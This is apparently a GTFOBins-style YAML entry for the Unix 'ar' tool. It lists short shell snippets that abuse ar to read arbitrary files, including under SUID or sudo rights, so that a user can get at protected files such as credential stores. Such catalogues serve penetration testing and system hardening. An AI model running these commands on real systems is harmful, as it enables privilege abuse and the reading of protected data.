---
description: The file appears amid the binary content of the archive.
functions:
  file-read:
    - code: |
        OUTFILE=$(mktemp -u)
        LFILE=file_to_read
        ar r "$OUTFILE" "$LFILE"
        cat "$OUTFILE"
  suid:
    - code: |
        OUTFILE=$(mktemp -u)
        LFILE=file_to_read
        ./ar r "$OUTFILE" "$LFILE"
        cat "$OUTFILE"
  sudo:
    - code: |
        OUTFILE=$(mktemp -u)
        LFILE=file_to_read
        sudo ar r "$OUTFILE" "$LFILE"
        cat "$OUTFILE"
---
